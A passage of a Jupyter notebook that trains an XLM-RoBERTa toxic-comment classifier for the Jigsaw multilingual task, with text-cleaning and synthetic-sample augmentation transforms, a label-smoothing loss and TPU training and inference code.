    "    text = exclude_duplicate_sentences(text, lang)\n",
    "\n",
    "    return text.strip()\n",
    "\n",
    "\n",
    "class NLPTransform(BasicTransform):\n",
    "    \"\"\" Transform for nlp task.\"\"\"\n",
    "\n",
    "    @property\n",
    "    def targets(self):\n",
    "        return {\"data\": self.apply}\n",
    "\n",
    "    def update_params(self, params, **kwargs):\n",
    "        if hasattr(self, \"interpolation\"):\n",
    "            params[\"interpolation\"] = self.interpolation\n",
    "\n",
    "        if hasattr(self, \"fill_value\"):\n",
    "            params[\"fill_value\"] = self.fill_value\n",
    "\n",
    "        return params\n",
    "\n",
    "    def get_sentences(self, text, lang='en'):\n",
    "        return sent_tokenize(text, LANGS.get(lang, 'english'))\n",
    "\n",
    "class ShuffleSentencesTransform(NLPTransform):\n",
    "    \"\"\" Do shuffle by sentence \"\"\"\n",
    "    def __init__(self, always_apply=False, p=0.5):\n",
    "        super(ShuffleSentencesTransform, self).__init__(always_apply, p)\n",
    "\n",
    "    def apply(self, data, **params):\n",
    "        text, lang = data\n",
    "        sentences = self.get_sentences(text, lang)\n",
    "        random.shuffle(sentences)\n",
    "\n",
    "        return ' '.join(sentences), lang\n",
    "\n",
    "class ExcludeDuplicateSentencesTransform(NLPTransform):\n",
    "    \"\"\" Exclude equal sentences \"\"\"\n",
    "    def __init__(self, always_apply=False, p=0.5):\n",
    "        super(ExcludeDuplicateSentencesTransform, self).__init__(always_apply, p)\n",
    "\n",
    "    def apply(self, data, **params):\n",
    "        text, lang = data\n",
    "        sentences = []\n",
    "\n",
    "        for sentence in self.get_sentences(text, lang):\n",
    "            sentence = sentence.strip()\n",
    "\n",
    "            if sentence not in sentences:\n",
    "                sentences.append(sentence)\n",
    "\n",
    "        return ' '.join(sentences), lang\n",
    "\n",
    "class ExcludeNumbersTransform(NLPTransform):\n",
    "    \"\"\" exclude any numbers \"\"\"\n",
    "    def __init__(self, always_apply=False, p=0.5):\n",
    "        super(ExcludeNumbersTransform, self).__init__(always_apply, p)\n",
    "\n",
    "    def apply(self, data, **params):\n",
    "        text, lang = data\n",
    "        text = re.sub(r'[0-9]', '', text)\n",
    "        text = re.sub(r'\\s+', ' ', text)\n",
    "\n",
    "        return text, lang\n",
    "\n",
    "class ExcludeHashtagsTransform(NLPTransform):\n",
    "    \"\"\" Exclude any hashtags with # \"\"\"\n",
    "    def __init__(self, always_apply=False, p=0.5):\n",
    "        super(ExcludeHashtagsTransform, self).__init__(always_apply, p)\n",
    "\n",
    "    def apply(self, data, **params):\n",
    "        text, lang = data\n",
    "        text = re.sub(r'#[\\S]+\\b', '', text)\n",
    "        text = re.sub(r'\\s+', ' ', text)\n",
    "\n",
    "        return text, lang\n",
    "\n",
    "class ExcludeUsersMentionedTransform(NLPTransform):\n",
    "    \"\"\" Exclude @users \"\"\"\n",
    "    def __init__(self, always_apply=False, p=0.5):\n",
    "        super(ExcludeUsersMentionedTransform, self).__init__(always_apply, p)\n",
    "\n",
    "    def apply(self, data, **params):\n",
    "        text, lang = data\n",
    "        text = re.sub(r'@[\\S]+\\b', '', text)\n",
    "        text = re.sub(r'\\s+', ' ', text)\n",
    "\n",
    "        return text, lang\n",
    "\n",
    "class ExcludeUrlsTransform(NLPTransform):\n",
    "    \"\"\" Exclude urls \"\"\"\n",
    "    def __init__(self, always_apply=False, p=0.5):\n",
    "        super(ExcludeUrlsTransform, self).__init__(always_apply, p)\n",
    "\n",
    "    def apply(self, data, **params):\n",
    "        text, lang = data\n",
    "        text = re.sub(r'https?\\S+', '', text)\n",
    "        text = re.sub(r'\\s+', ' ', text)\n",
    "\n",
    "        return text, lang"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "uFB3UeyAsYCp"
   },
   "outputs": [],
   "source": [
    "class SynthesicOpenSubtitlesTransform(NLPTransform):\n",
    "    def __init__(self, always_apply=False, p=0.5):\n",
    "        super(SynthesicOpenSubtitlesTransform, self).__init__(always_apply, p)\n",
    "        df = pd.read_csv(f'{ROOT_PATH}/input/open-subtitles-toxic-pseudo-labeling/open-subtitles-synthesic.csv', index_col='id')[['comment_text', 'toxic', 'lang']]\n",
    "        df = df[~df['comment_text'].isna()]\n",
    "        df['comment_text'] = df.parallel_apply(lambda x: clean_text(x['comment_text'], x['lang']), axis=1)\n",
    "        df = df.drop_duplicates(subset='comment_text')\n",
    "        df['toxic'] = df['toxic'].round().astype(np.int)\n",
    "\n",
    "        self.synthesic_toxic = df[df['toxic'] == 1].comment_text.values\n",
    "        self.synthesic_non_toxic = df[df['toxic'] == 0].comment_text.values\n",
    "\n",
    "        del df\n",
    "        gc.collect();\n",
    "\n",
    "    def generate_synthesic_sample(self, text, toxic):\n",
    "        texts = [text]\n",
    "\n",
    "        if toxic == 0:\n",
    "            for i in range(random.randint(1,5)):\n",
    "                texts.append(random.choice(self.synthesic_non_toxic))\n",
    "        else:\n",
    "            for i in range(random.randint(0,2)):\n",
    "                texts.append(random.choice(self.synthesic_non_toxic))\n",
    "\n",
    "            for i in range(random.randint(1,3)):\n",
    "                texts.append(random.choice(self.synthesic_toxic))\n",
    "        random.shuffle(texts)\n",
    "\n",
    "        return ' '.join(texts)\n",
    "\n",
    "    def apply(self, data, **params):\n",
    "        text, toxic = data\n",
    "        text = self.generate_synthesic_sample(text, toxic)\n",
    "\n",
    "        return text, toxic"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34,
     "referenced_widgets": [
      "845fc7a27787461e95026f1d36f4ef8b",
      "9fa9c3af9c804ec29d87fa5300fa657d",
      "a6b7a79f1c524356b800c64df25d7284",
      "c2c417dab722401a909327db58b48033"
     ]
    },
    "colab_type": "code",
    "id": "K5BdJ9HWvnLW",
    "outputId": "eeadb258-3d56-4b38-90f2-a749d74ba483"
   },
   "outputs": [],
   "source": [
    "def get_train_transforms():\n",
    "    return albumentations.Compose([\n",
    "        ExcludeUsersMentionedTransform(p=0.95),\n",
    "        ExcludeUrlsTransform(p=0.95),\n",
    "        ExcludeNumbersTransform(p=0.95),\n",
    "        ExcludeHashtagsTransform(p=0.95),\n",
    "        ExcludeDuplicateSentencesTransform(p=0.95),\n",
    "    ], p=1.0)\n",
    "\n",
    "def get_synthesic_transforms():\n",
    "    return SynthesicOpenSubtitlesTransform(p=0.5)\n",
    "\n",
    "\n",
    "train_transforms = get_train_transforms();\n",
    "synthesic_transforms = get_synthesic_transforms()\n",
    "tokenizer = XLMRobertaTokenizer.from_pretrained(BACKBONE_PATH)\n",
    "shuffle_transforms = ShuffleSentencesTransform(always_apply=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "qFp80AuJu9Ii"
   },
   "outputs": [],
   "source": [
    "def onehot(size, target, aux=None):\n",
    "    if aux is not None:\n",
    "        vec = np.zeros(size+len(aux), dtype=np.float32)\n",
    "        vec[target] = 1.\n",
    "        vec[2:] = aux\n",
    "        vec = torch.tensor(vec, dtype=torch.float32)\n",
    "    else:\n",
    "        vec = torch.zeros(size, dtype=torch.float32)\n",
    "        vec[target] = 1.\n",
    "\n",
    "    return vec\n",
    "\n",
    "from kaggle_runner import may_debug\n",
    "\n",
    "class DatasetRetriever(Dataset):\n",
    "    def __init__(self, labels_or_ids, comment_texts, langs,\n",
    "                 severe_toxic=None, obscene=None, threat=None, insult=None, identity_hate=None,\n",
    "                 use_train_transforms=False, test=False, use_aux=True):\n",
    "        self.test = test\n",
    "        self.labels_or_ids = labels_or_ids\n",
    "        self.comment_texts = comment_texts\n",
    "        self.langs = langs\n",
    "        self.severe_toxic = severe_toxic\n",
    "        self.obscene = obscene\n",
    "        self.threat = threat\n",
    "        self.insult = insult\n",
    "        self.identity_hate = identity_hate\n",
    "        self.use_train_transforms = use_train_transforms\n",
    "        self.aux = None\n",
    "\n",
    "        if use_aux:\n",
    "            self.aux = [self.severe_toxic, self.obscene, self.threat, self.insult, self.identity_hate]\n",
    "\n",
    "    def get_tokens(self, text):\n",
    "        encoded = tokenizer.encode_plus(\n",
    "            text,\n",
    "            add_special_tokens=True,\n",
    "            max_length=MAX_LENGTH,\n",
    "            pad_to_max_length=True\n",
    "        )\n",
    "\n",
    "        return encoded['input_ids'], encoded['attention_mask']\n",
    "\n",
    "    def __len__(self):\n",
    "        return self.comment_texts.shape[0]\n",
    "\n",
    "    def __getitem__(self, idx):\n",
    "        text = self.comment_texts[idx]\n",
    "        lang = self.langs[idx]\n",
    "\n",
    "        if self.severe_toxic is None:\n",
    "            aux = [0., 0., 0., 0., 0.]\n",
    "        else:\n",
    "            aux = [self.severe_toxic[idx], self.obscene[idx], self.threat[idx], self.insult[idx], self.identity_hate[idx]]\n",
    "\n",
    "        if self.test is False:\n",
    "            label = self.labels_or_ids[idx]\n",
    "            target = onehot(2, label, aux=aux)\n",
    "\n",
    "        if self.use_train_transforms:\n",
    "            text, _ = train_transforms(data=(text, lang))['data']\n",
    "            tokens, attention_mask = self.get_tokens(str(text))\n",
    "            token_length = sum(attention_mask)\n",
    "\n",
    "            if token_length > 0.8*MAX_LENGTH:\n",
    "                text, _ = shuffle_transforms(data=(text, lang))['data']\n",
    "            elif token_length < 60:\n",
    "                text, _ = synthesic_transforms(data=(text, label))['data']\n",
    "            else:\n",
    "                tokens, attention_mask = torch.tensor(tokens), torch.tensor(attention_mask)\n",
    "\n",
    "                return target, tokens, attention_mask\n",
    "\n",
    "        tokens, attention_mask = self.get_tokens(str(text))\n",
    "        tokens, attention_mask = torch.tensor(tokens), torch.tensor(attention_mask)\n",
    "\n",
    "        if self.test is False:\n",
    "            return target, tokens, attention_mask\n",
    "\n",
    "        return self.labels_or_ids[idx], tokens, attention_mask\n",
    "\n",
    "    def get_labels(self):\n",
    "        return list(np.char.add(self.labels_or_ids.astype(str), self.langs))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 173
    },
    "colab_type": "code",
    "id": "3DVkkUVMu9Ka",
    "outputId": "2434e74b-0f48-41e7-aa86-a9b8a8984772"
   },
   "outputs": [],
   "source": [
    "%%time\n",
    "\n",
    "df_train = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-toxicity-train-data-with-aux/train_data.csv')\n",
    "\n",
    "\n",
    "train_dataset = DatasetRetriever(\n",
    "    labels_or_ids=df_train['toxic'].values,\n",
    "    comment_texts=df_train['comment_text'].values,\n",
    "    langs=df_train['lang'].values,\n",
    "    severe_toxic=df_train['severe_toxic'].values,\n",
    "    obscene=df_train['obscene'].values,\n",
    "    threat=df_train['threat'].values,\n",
    "    insult=df_train['insult'].values,\n",
    "    identity_hate=df_train['identity_hate'].values,\n",
    "    use_train_transforms=True,\n",
    ")\n",
    "\n",
    "del df_train\n",
    "gc.collect();\n",
    "\n",
    "for targets, tokens, attention_masks in train_dataset:\n",
    "    break\n",
    "\n",
    "print(targets)\n",
    "print(tokens.shape)\n",
    "print(attention_masks.shape)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 52
    },
    "colab_type": "code",
    "id": "PlcGdUdSYewm",
    "outputId": "3f81ef87-94f8-45a1-9011-3addf641e5bb"
   },
   "outputs": [],
   "source": [
    "np.unique(train_dataset.get_labels())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 69
    },
    "colab_type": "code",
    "id": "bW4dEWaYu9NF",
    "outputId": "7223d7c0-1b1c-40bf-b821-998b39d4f466"
   },
   "outputs": [],
   "source": [
    "df_val = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-multilingual-toxic-comment-classification/validation.csv', index_col='id')\n",
    "\n",
    "validation_tune_dataset = DatasetRetriever(\n",
    "    labels_or_ids=df_val['toxic'].values,\n",
    "    comment_texts=df_val['comment_text'].values,\n",
    "    langs=df_val['lang'].values,\n",
    "    use_train_transforms=True,\n",
    ")\n",
    "\n",
    "df_val['comment_text'] = df_val.parallel_apply(lambda x: clean_text(x['comment_text'], x['lang']), axis=1)\n",
    "\n",
    "validation_dataset = DatasetRetriever(\n",
    "    labels_or_ids=df_val['toxic'].values,\n",
    "    comment_texts=df_val['comment_text'].values,\n",
    "    langs=df_val['lang'].values,\n",
    "    use_train_transforms=False,\n",
    ")\n",
    "\n",
    "del df_val\n",
    "gc.collect();\n",
    "\n",
    "for targets, tokens, attention_masks in validation_dataset:\n",
    "    break\n",
    "\n",
    "print(targets)\n",
    "print(tokens.shape)\n",
    "print(attention_masks.shape)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 69
    },
    "colab_type": "code",
    "id": "zNdADp28v3av",
    "outputId": "56519c84-55fa-4de1-da37-ac4578fba3b9"
   },
   "outputs": [],
   "source": [
    "df_test = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-multilingual-toxic-comment-classification/test.csv', index_col='id')\n",
    "df_test['comment_text'] = df_test.parallel_apply(lambda x: clean_text(x['content'], x['lang']), axis=1)\n",
    "\n",
    "test_dataset = DatasetRetriever(\n",
    "    labels_or_ids=df_test.index.values,\n",
    "    comment_texts=df_test['comment_text'].values,\n",
    "    langs=df_test['lang'].values,\n",
    "    use_train_transforms=False,\n",
    "    test=True\n",
    ")\n",
    "\n",
    "del df_test\n",
    "gc.collect();\n",
    "\n",
    "for ids, tokens, attention_masks in test_dataset:\n",
    "    break\n",
    "\n",
    "print(ids)\n",
    "print(tokens.shape)\n",
    "print(attention_masks.shape)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "I2bN_NySwU6c"
   },
   "outputs": [],
   "source": [
    "class RocAucMeter(object):\n",
    "    def __init__(self):\n",
    "        self.reset()\n",
    "\n",
    "    def reset(self):\n",
    "        self.y_true = np.array([0,1])\n",
    "        self.y_pred = np.array([0.5,0.5])\n",
    "        self.score = 0\n",
    "\n",
    "    def update(self, y_true, y_pred):\n",
    "        y_true = y_true.cpu().numpy().argmax(axis=1)\n",
    "        y_pred = nn.functional.softmax(y_pred, dim=1).data.cpu().numpy()[:,1]\n",
    "        self.y_true = np.hstack((self.y_true, y_true))\n",
    "        self.y_pred = np.hstack((self.y_pred, y_pred))\n",
    "        self.score = sklearn.metrics.roc_auc_score(self.y_true, self.y_pred, labels=np.array([0, 1]))\n",
    "\n",
    "    @property\n",
    "    def avg(self):\n",
    "        return self.score\n",
    "\n",
    "class AverageMeter(object):\n",
    "    \"\"\"Computes and stores the average and current value\"\"\"\n",
    "    def __init__(self):\n",
    "        self.reset()\n",
    "\n",
    "    def reset(self):\n",
    "        self.val = 0\n",
    "        self.avg = 0\n",
    "        self.sum = 0\n",
    "        self.count = 0\n",
    "\n",
    "    def update(self, val, n=1):\n",
    "        self.val = val\n",
    "        self.sum += val * n\n",
    "        self.count += n\n",
    "        self.avg = self.sum / self.count"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "arcC5IeYxUbr"
   },
   "outputs": [],
   "source": [
    "from kaggle_runner import may_debug\n",
    "\n",
    "\n",
    "class LabelSmoothing(nn.Module):\n",
    "    \"\"\"https://github.com/pytorch/pytorch/issues/7455#issuecomment-513062631\"\"\"\n",
    "\n",
    "    def __init__(self, smoothing = 0.1, dim=-1):\n",
    "        super(LabelSmoothing, self).__init__()\n",
    "        self.cls = 2\n",
    "        self.confidence = 1.0 - smoothing\n",
    "        self.smoothing = smoothing\n",
    "        self.dim = dim\n",
    "\n",
    "    def forward(self, x, target):\n",
    "        may_debug()\n",
    "        if self.training:\n",
    "            pred = x[:,:2].log_softmax(dim=self.dim)\n",
    "            aux=x[:, 2:]\n",
    "\n",
    "            toxic_target = target[:,:2]\n",
    "            aux_target = target[:, 2:]\n",
    "            with torch.no_grad():\n",
    "                # true_dist = pred.data.clone()\n",
    "                true_dist = torch.zeros_like(pred)\n",
    "                true_dist.fill_(self.smoothing) # hardcode for binary classification\n",
    "                true_dist += (1-self.smoothing*2)*toxic_target\n",
    "                # true_dist.scatter_(1, toxic_target.data.unsqueeze(1), self.confidence) # only for 0 1 label, put confidence to related place\n",
    "\n",
    "                # for 0-1, 0 -> 0.1, 1->0.9.(if 1), if zero. 0->0.9, 1->0.1\n",
    "                smooth_aux = torch.zeros_like(aux_target)\n",
    "                smooth_aux.fill_(self.smoothing) # only for binary cross entropy\n",
    "                smooth_aux += (1-self.smoothing*2)*aux_target  # only for binary cross entropy, so for lable, it is (1-smooth)*\n",
    "\n",
    "            aux_loss = torch.nn.functional.binary_cross_entropy_with_logits(aux, smooth_aux)\n",
    "\n",
    "            return torch.mean(torch.sum(-true_dist * pred, dim=self.dim)) + aux_loss/5\n",
    "        else:\n",
    "            return torch.nn.functional.binary_cross_entropy_with_logits(x[:,:2], target[:,:2])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "Ow13PTlFwbiH"
   },
   "outputs": [],
   "source": [
    "import warnings\n",
    "\n",
    "warnings.filterwarnings(\"ignore\")\n",
    "\n",
    "import torch_xla\n",
    "import torch_xla.core.xla_model as xm\n",
    "import torch_xla.distributed.parallel_loader as pl\n",
    "import torch_xla.distributed.xla_multiprocessing as xmp\n",
    "\n",
    "from catalyst.data.sampler import DistributedSamplerWrapper, BalanceClassSampler\n",
    "\n",
    "class TPUFitter:\n",
    "\n",
    "    def __init__(self, model, device, config):\n",
    "        if not os.path.exists('node_submissions'):\n",
    "            os.makedirs('node_submissions')\n",
    "\n",
    "        self.config = config\n",
    "        self.epoch = 0\n",
    "        self.log_path = 'log.txt'\n",
    "\n",
    "        self.model = model\n",
    "        self.device = device\n",
    "\n",
    "        param_optimizer = list(self.model.named_parameters())\n",
    "        no_decay = ['bias', 'LayerNorm.bias', 'LayerNorm.weight']\n",
    "        optimizer_grouped_parameters = [\n",
    "            {'params': [p for n, p in param_optimizer if not any(nd in n for nd in no_decay)], 'weight_decay': 0.001},\n",
    "            {'params': [p for n, p in param_optimizer if any(nd in n for nd in no_decay)], 'weight_decay': 0.0}\n",
    "        ]\n",
    "\n",
    "        self.optimizer = AdamW(optimizer_grouped_parameters, lr=config.lr*xm.xrt_world_size())\n",
    "        self.scheduler = config.SchedulerClass(self.optimizer, **config.scheduler_params)\n",
    "\n",
    "        self.criterion = config.criterion\n",
    "        xm.master_print(f'Fitter prepared. Device is {self.device}')\n",
    "\n",
    "    def fit(self, train_loader, validation_loader):\n",
    "        for e in range(self.config.n_epochs):\n",
    "            if self.config.verbose:\n",
    "                lr = self.optimizer.param_groups[0]['lr']\n",
    "                timestamp = datetime.utcnow().isoformat()\n",
    "                self.log(f'\\n{timestamp}\\nLR: {lr}')\n",
    "\n",
    "            t = time.time()\n",
    "            para_loader = pl.ParallelLoader(train_loader, [self.device])\n",
    "            losses, final_scores = self.train_one_epoch(para_loader.per_device_loader(self.device))\n",
    "\n",
    "            self.log(f'[RESULT]: Train. Epoch: {self.epoch}, loss: {losses.avg:.5f}, final_score: {final_scores.avg:.5f}, time: {(time.time() - t):.5f}')\n",
    "\n",
    "            t = time.time()\n",
    "            para_loader = pl.ParallelLoader(validation_loader, [self.device])\n",
    "            losses, final_scores = self.validation(para_loader.per_device_loader(self.device))\n",
    "\n",
    "            self.log(f'[RESULT]: Validation. Epoch: {self.epoch}, loss: {losses.avg:.5f}, final_score: {final_scores.avg:.5f}, time: {(time.time() - t):.5f}')\n",
    "\n",
    "            if self.config.validation_scheduler:\n",
    "                self.scheduler.step(metrics=final_scores.avg)\n",
    "\n",
    "            self.epoch += 1\n",
    "\n",
    "    def run_tuning_and_inference(self, test_loader, validation_tune_loader):\n",
    "        for e in range(2):\n",
    "            self.optimizer.param_groups[0]['lr'] = self.config.lr*xm.xrt_world_size()\n",
    "            para_loader = pl.ParallelLoader(validation_tune_loader, [self.device])\n",
    "            losses, final_scores = self.train_one_epoch(para_loader.per_device_loader(self.device))\n",
    "            para_loader = pl.ParallelLoader(test_loader, [self.device])\n",
    "            self.run_inference(para_loader.per_device_loader(self.device))\n",
    "\n",
    "    def validation(self, val_loader):\n",
    "        self.model.eval()\n",
    "        losses = AverageMeter()\n",
    "        final_scores = RocAucMeter()\n",
    "\n",
    "        t = time.time()\n",
    "\n",
    "        for step, (targets, inputs, attention_masks) in enumerate(val_loader):\n",
    "            if self.config.verbose:\n",
    "                if step % self.config.verbose_step == 0:\n",
    "                    xm.master_print(\n",
    "                        f'Valid Step {step}, loss: ' + \\\n",
    "                        f'{losses.avg:.5f}, final_score: {final_scores.avg:.5f}, ' + \\\n",
    "                        f'time: {(time.time() - t):.5f}'\n",
    "                    )\n",
    "            with torch.no_grad():\n",
    "                inputs = inputs.to(self.device, dtype=torch.long)\n",
    "                attention_masks = attention_masks.to(self.device, dtype=torch.long)\n",
    "                targets = targets.to(self.device, dtype=torch.float)\n",
    "\n",
    "                outputs = self.model(inputs, attention_masks)\n",
    "                loss = self.criterion(outputs, targets)\n",
    "\n",
    "                batch_size = inputs.size(0)\n",
    "\n",
    "                final_scores.update(targets, outputs)\n",
    "                losses.update(loss.detach().item(), batch_size)\n",
    "\n",
    "        return losses, final_scores\n",
    "\n",
    "    def train_one_epoch(self, train_loader):\n",
    "        self.model.train()\n",
    "\n",
    "        losses = AverageMeter()\n",
    "        final_scores = RocAucMeter()\n",
    "        t = time.time()\n",
    "\n",
    "        for step, (targets, inputs, attention_masks) in enumerate(train_loader):\n",
    "            if self.config.verbose:\n",
    "                if step % self.config.verbose_step == 0:\n",
    "                    self.log(\n",
    "                        f'Train Step {step}, loss: ' + \\\n",
    "                        f'{losses.avg:.5f}, final_score: {final_scores.avg:.5f}, ' + \\\n",
    "                        f'time: {(time.time() - t):.5f}'\n",
    "                    )\n",
    "\n",
    "            inputs = inputs.to(self.device, dtype=torch.long)\n",
    "            attention_masks = attention_masks.to(self.device, dtype=torch.long)\n",
    "            targets = targets.to(self.device, dtype=torch.float)\n",
    "\n",
    "            self.optimizer.zero_grad()\n",
    "\n",
    "            outputs = self.model(inputs, attention_masks)\n",
    "            loss = self.criterion(outputs, targets)\n",
    "\n",
    "            batch_size = inputs.size(0)\n",
    "\n",
    "            final_scores.update(targets, outputs)\n",
    "\n",
    "            losses.update(loss.detach().item(), batch_size)\n",
    "\n",
    "            loss.backward()\n",
    "            xm.optimizer_step(self.optimizer)\n",
    "\n",
    "            if self.config.step_scheduler:\n",
    "                self.scheduler.step()\n",
    "\n",
    "        self.model.eval()\n",
    "        self.save('last-checkpoint.bin')\n",
    "\n",
    "        return losses, final_scores\n",
    "\n",
    "    def run_inference(self, test_loader):\n",
    "        self.model.eval()\n",
    "        result = {'id': [], 'toxic': []}\n",
    "        t = time.time()\n",
    "\n",
    "        for step, (ids, inputs, attention_masks) in enumerate(test_loader):\n",
    "            if self.config.verbose:\n",
    "                if step % self.config.verbose_step == 0:\n",
    "                    xm.master_print(f'Prediction Step {step}, time: {(time.time() - t):.5f}')\n",
    "\n",
    "            with torch.no_grad():\n",
    "                inputs = inputs.to(self.device, dtype=torch.long)\n",
    "                attention_masks = attention_masks.to(self.device, dtype=torch.long)\n",
    "                outputs = self.model(inputs, attention_masks)\n",
    "                toxics = nn.functional.softmax(outputs, dim=1).data.cpu().numpy()[:,1]\n",
    "\n",
    "            result['id'].extend(ids.cpu().numpy())\n",
    "            result['toxic'].extend(toxics)\n",
    "\n",
    "        result = pd.DataFrame(result)\n",
    "        node_count = len(glob('node_submissions/*.csv'))\n",
    "        result.to_csv(f'node_submissions/submission_{node_count}_{datetime.utcnow().microsecond}_{random.random()}.csv', index=False)\n",
    "\n",
    "    def save(self, path):\n",
    "        xm.save(self.model.state_dict(), path)\n",
    "\n",
    "    def log(self, message):\n",
    "        if self.config.verbose:\n",
    "            xm.master_print(message)\n",
    "        with open(self.log_path, 'a+') as logger:\n",
    "            xm.master_print(f'{message}', logger)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "kO9ovGhdwb7W"
   },
   "outputs": [],
   "source": [
    "from transformers import XLMRobertaModel\n",
    "\n",
    "class ToxicSimpleNNModel(nn.Module):\n",
    "\n",
    "    def __init__(self, use_aux=True):\n",
    "        super(ToxicSimpleNNModel, self).__init__()\n",
    "        self.backbone = XLMRobertaModel.from_pretrained(BACKBONE_PATH)\n",
    "        self.dropout = nn.Dropout(0.3)\n",
    "        aux_len = 0\n",
    "\n",
    "        if use_aux:\n",
    "            aux_len = 5\n",
    "        self.linear = nn.Linear(\n",
    "            in_features=self.backbone.pooler.dense.out_features*2,\n",
    "            out_features=2+aux_len,\n",
    "        )\n",
    "\n",
    "    def forward(self, input_ids, attention_masks):\n",
    "        bs, seq_length = input_ids.shape\n",
    "        seq_x, _ = self.backbone(input_ids=input_ids, attention_mask=attention_masks)\n",
    "        apool = torch.mean(seq_x, 1)\n",
    "        mpool, _ = torch.max(seq_x, 1)\n",
    "        x = torch.cat((apool, mpool), 1)\n",
    "        x = self.dropout(x)\n",
    "\n",
    "        return self.linear(x)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "dZmTJ4XQwb9y"
   },
   "outputs": [],
   "source": [
    "class TrainGlobalConfig:\n",
    "    \"\"\" Global Config for this notebook \"\"\"\n",
    "    num_workers = 0  # количество воркеров для loaders\n",
    "    batch_size = 16  # bs\n",
    "    n_epochs = 2  # количество эпох для обучения\n",
    "    lr = 0.5 * 1e-5 # стартовый learning rate (внутри логика работы с мульти TPU домножает на кол-во процессов)\n",
    "    fold_number = 0  # номер фолда для обучения\n",
    "\n",
    "    # -------------------\n",
    "    verbose = True  # выводить принты\n",
    "    verbose_step = 50  # количество шагов для вывода принта\n",
    "    # -------------------\n",
    "\n",
    "    # --------------------\n",
    "    step_scheduler = False  # выполнять scheduler.step после вызова optimizer.step\n",
    "    validation_scheduler = True  # выполнять scheduler.step после валидации loss (например для плато)\n",
    "    SchedulerClass = torch.optim.lr_scheduler.ReduceLROnPlateau\n",
    "    scheduler_params = dict(\n",
    "        mode='max',\n",
    "        factor=0.7,\n",
    "        patience=0,\n",
    "        verbose=False,\n",
    "        threshold=0.0001,\n",
    "        threshold_mode='abs',\n",
    "        cooldown=0,\n",
    "        min_lr=1e-8,\n",
    "        eps=1e-08\n",
    "    )\n",
    "    # --------------------\n",
    "\n",
    "    # -------------------\n",
    "    criterion = LabelSmoothing()\n",
    "    # -------------------"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 116,
     "referenced_widgets": [
      "0ccb005ba947422690d07ef78baa1a7a",
      "294b563929184f44a10a4863a9226dc8",
      "24d04c1e3ad04c51b9a00b245f878291",
      "0526c4b17e21402491202127c3a3d085",
      "39a1cd7166f145d8aec6502badba27ff",
      "8ab315cc4bf54df3bd7cb3f8d1c91c66",
      "45ed802494e943c1b32597829a5232c0",
      "707a2436e59b447eab6fce9dfd6f8c4d",
      "387da2c8aa984eaa84ebaa00205ec89a",
      "47d4753fe35a46a3b8599bb4da4f8630",
      "c88d3ee1730d45468fb04fa06192246e",
      "b4ee953b01bc4f82b29ae4885dc9dd24",
      "9035a40f51e84a219a82d4524f60d0f1",
      "4ee4bf92166a4b5d8bfbe816a75a9bff",
      "2562c88dcf9f41a7ac3d80bb5a8f69fa",
      "c05fd87a1a0b49c98c078d8c33fb8b0f"
     ]
    },
    "colab_type": "code",
    "id": "_79qoceFwcAF",
    "outputId": "09f5510d-c2e1-4f19-9dfa-8956d414a564"
   },
   "outputs": [],
   "source": [
    "net = ToxicSimpleNNModel()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "InecI_CbxXA_"
   },
   "outputs": [],
   "source": [
    "def _gpu_fn():\n",
    "    from kaggle_runner import logger\n",
    "    device = torch.device('cpu')\n",
    "    net.to(device)\n",
    "\n",
    "    #test_sampler = torch.utils.data.distributed.DistributedSampler(\n",
    "    #    test_dataset,\n",
    "    #    num_replicas=xm.xrt_world_size(),\n",
    "    #    rank=xm.get_ordinal(),\n",
    "    #    shuffle=False\n",
    "    #)\n",
    "    test_loader = torch.utils.data.DataLoader(\n",
    "        test_dataset,\n",
    "        batch_size=TrainGlobalConfig.batch_size,\n",
    "    #    sampler=test_sampler,\n",
    "        pin_memory=False,\n",
    "        drop_last=False,\n",
    "        num_workers=TrainGlobalConfig.num_workers\n",
    "    )\n",
    "\n",
    "    def validation(model, device, config, val_loader, criterion):\n",
    "        model.eval()\n",
    "        losses = AverageMeter()\n",
    "        final_scores = RocAucMeter()\n",
    "\n",
    "        t = time.time()\n",
    "\n",
    "        for step, (targets, inputs, attention_masks) in enumerate(val_loader):\n",
    "            if config.verbose:\n",
    "                if step % config.verbose_step == 0:\n",
    "                    logger.info(\n",
    "                        f'Valid Step {step}, loss: ' + \\\n",
    "                        f'{losses.avg:.5f}, final_score: {final_scores.avg:.5f}, ' + \\\n",
    "                        f'time: {(time.time() - t):.5f}'\n",
    "                    )\n",
    "            with torch.no_grad():\n",
    "                inputs = inputs.to(device, dtype=torch.long)\n",
    "                attention_masks = attention_masks.to(device, dtype=torch.long)\n",
    "                targets = targets.to(device, dtype=torch.float)\n",
    "\n",
